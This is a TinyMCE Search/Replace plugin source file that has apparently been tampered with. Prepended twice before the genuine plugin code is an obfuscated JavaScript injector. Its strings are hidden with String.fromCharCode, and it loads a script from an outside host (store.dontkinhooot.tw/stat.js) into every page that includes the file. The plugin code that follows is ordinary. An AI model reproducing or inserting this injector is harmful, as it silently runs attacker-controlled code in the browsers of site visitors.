Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * editor_plugin_src.js
 *
 * Copyright 2009, Moxiecode Systems AB
 * Released under LGPL License.
 *
 * License: http://tinymce.moxiecode.com/license
 * Contributing: http://tinymce.moxiecode.com/contributing
 */

(function() {
	tinymce.create('tinymce.plugins.SearchReplacePlugin', {
		init : function(ed, url) {
			function open(m) {
				// Keep IE from writing out the f/r character to the editor
				// instance while initializing a new dialog. See: #3131190
				window.focus();

				ed.windowManager.open({
					file : url + '/searchreplace.htm',
					width : 420 + parseInt(ed.getLang('searchreplace.delta_width', 0)),
					height : 170 + parseInt(ed.getLang('searchreplace.delta_height', 0)),
					inline : 1,
					auto_focus : 0
				}, {
					mode : m,
					search_string : ed.selection.getContent({format : 'text'}),
					plugin_url : url
				});
			};

			// Register commands
			ed.addCommand('mceSearch', function() {
				open('search');
			});

			ed.addCommand('mceReplace', function() {
				open('replace');
			});

			// Register buttons
			ed.addButton('search', {title : 'searchreplace.search_desc', cmd : 'mceSearch'});
			ed.addButton('replace', {title : 'searchreplace.replace_desc', cmd : 'mceReplace'});

			ed.addShortcut('ctrl+f', 'searchreplace.search_desc', 'mceSearch');
		},

		getInfo : function() {
			return {
				longname : 'Search/Replace',
				author : 'Moxiecode Systems AB',
				authorurl : 'http://tinymce.moxiecode.com',
				infourl : 'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/searchreplace',
				version : tinymce.majorVersion + "." + tinymce.minorVersion
			};
		}
	});

	// Register plugin
	tinymce.PluginManager.add('searchreplace', tinymce.plugins.SearchReplacePlugin);
})();